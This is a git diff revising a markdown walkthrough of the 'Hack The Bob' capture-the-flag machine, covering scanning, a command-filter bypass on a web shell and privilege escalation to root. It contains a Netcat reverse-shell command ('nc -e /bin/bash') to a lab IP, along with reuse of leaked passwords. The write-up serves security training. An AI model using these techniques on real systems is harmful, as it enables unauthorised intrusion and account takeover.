@@ -1,4 +1,8 @@
 <style> 
+    h1 {
+        font-size: 36px;
+        font-weight: bold;
+    }
     body { 
         background-color: white; 
         color: black;
@@ -18,10 +22,10 @@ The walkthrough [Hack The Bob: 1.0.1](https://www.hackingarticles.in/hack-the-bo
 ## Content
 
 - [**Discovery**](#discovery) &rightarrow; network scanning and services enumeration
-- [**Initial Access**](#initial-access) &rightarrow; expoit RCE vulnerability on web application
-- [**Execution**](#execution) &rightarrow; establish reverse shell using netcat
-- [**Credential Access**](cre) &rightarrow; abuse of legitimate credentials stored unsecurely in the machine
-- [**Privilege Escalation**](pri) &rightarrow; abuse of valid accounts with high privileges
+- [**Initial Access**](#initial-access) &rightarrow; exploit RCE vulnerability on web application
+- [**Execution**](#execution) &rightarrow; establish reverse shell using Netcat
+- [**Credential Access**](#credential-access) &rightarrow; abuse of legitimate credentials stored insecurely in the machine
+- [**Privilege Escalation**](#privilege-escalation) &rightarrow; abuse of valid accounts with high privileges
 
 ## Threat Model
 
@@ -71,22 +75,19 @@ However, upon closer analysis of `nmap` output detailing the web server, it beco
 Examining its contents, four entries stand out as disallowed `/login.php`, `/passwords.html`, `/lat_memo.html` and `/dev_shell.php`. These names are interesting names, but further investigation reveals that only the page `http://hackthebob/dev_shell.php` is worthy: it appears to be a web shell, suggesting a potential entry point for a possible exploration.
 
 ### Initial Access
-The first action is to test some basic bash commands to examine how the server reacts.
+The first action taken is testing some basic bash commands to examine how the server reacts. It appears that there's some internal block or filter in place, because commands such as `ls` or `pwd` display an error message, while the `id` command provides a coherent output.
 
-It appears that there's some internal block or filter in place, because commands such as `ls` or `pwd` display an error message, while the `id` command provides a coherent output.
-
-By attempting the command `id | ls` it became possible to list files. This strategy of nested commands can bypass the filter exploiting the fact that `ls` takes in input `id` output so that is possible to circumvent the filter.
-
+By attempting the command `id | ls` it became possible to list files. This strategy of nested commands can bypass the filter exploiting the fact that `ls` takes in input `id`'s output so that is possible to circumvent the filter.  
+The following picture shows the web interface of `dev_shell-php` file and the output of the `ls` command.
 
 ![3](images/dev.png)
 
-
-Now downloading with `curl` command `dev_shell.txt.bak` file, that is probably the backup file of `dev_shell.php`, it is possible to see the reason why the other commands didn't work.
+The download of `dev_shell.txt.bak` file, which is likely a backup of `dev_shell.php`, using `curl` command reveals why some commands didn't work. There is a filter probably set for mitigation. 
 
 ![4](images/blocked.png)
 
 ### Execution
-It is time now to establish a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections
+Since the circumvention has been found is time now to expoit it for establishing a connection through the web shell and the Kali machine. This is done using Netcat which is a command line tool for remote communication over TCP connections
 
 - on Kali side the command `nc -lvp 6000` is ran, so the Kali machine is now listening on port 6000 for connection requests: this is the server side of the future TCP connection
 - on the web interface of the target, command `id | nc -e /bin/bash 10.0.2.6 6000` is ran: this will be the client side of the TCP connection.
@@ -106,38 +107,41 @@ In the `/home` directory there are four other directories with person names  (bo
 On path `/home/bob/Documents/Secret/Keep_Out/No_Lookie_In_Here` there is a script `notes.sh`: executing it the output is a list of apparently no sense phrases.
 This output seams to have no meaning, but taking the first letter of each line the word HARPOCRATES is composed (this is the name of an Egyptian divinity), maybe it is the passphrase for the encrypted file.
 
-All steps from the netcat connection establishment to this point are shown in the following screenshot
+All steps from the netcat connection establishment to this point are shown in the following screenshot.
 
 ![5](images/harpo.png)
 
 Now it's needed to change account in order to decrypt `login.txt.gpg` bacause the current account `www-data` is not allowed.
 
 In `/home/elliot` there is a file, `theadminisdumb.txt`, that contains a long text with embedded two user's password. 
-Stando a questo file elliot's account has password 'theadminisdumb' while the jc' one has password 'Qwerty'.
+According to this file Elliot's account has password 'theadminisdumb' while the jc' one has password 'Qwerty'.
 
+### Credential Access
 To test this information, command `su elliot` is ran and, after inserting his password, the current account changes to elliot's one. Then it turns out that he has permission for decrypting the `.gpg` file, so the following command is ran for attempting decryption.
 
 ```bash
 gpg --batch –passphrase HARPOCRATES -d login.txt.gpg
 ```
+
 Decryption succeeded thanks to the right passphrase.
 Having the file in clear it is possible to read Bob's password which is 'b0bcat_'.
 
-All the steps citati are shown in the following screenshot.
+All the steps mentioned are shown in the following screenshot.
 
 ![6](images/elliot.png)
 
+### Privilege Escalation
 So now it is possible to change account again and impersonate Bob. Salta fuori that Bob is a user with root privileges (while Elliot did not)
 
 It is important to notice that Bob is not the owner of the file flag.txt, so it is not possible yet to capture the flag, but since Bob is a superuser, running just `sudo su` it is possible to became root account, this allow to capture the flag and conclude the challenge.
 
 ![7](images/root.png)
 
-A large set of credentials assure persistence over this web server, but it is also notable, from the utput of nmap command, that there is another server running on the machine
+A large set of credentials assure persistence over this web server, but it is also notable, from the output of `nmap` command, that there is another server running on the machine
 
-I tryed to connect with hackthebob on bob account via SSH
-`ssh -p 25468 bob@hackthebob` and I realised that with just this command i was inside the web seerver 
-i didn't have to interrract via browser
+I tried to connect with hackthebob on bob account via SSH
+`ssh -p 25468 bob@hackthebob` and I realized that with just this command i was inside the web server 
+i didn't have to interact via browser
 
 
 ![8](images/ssh.png)
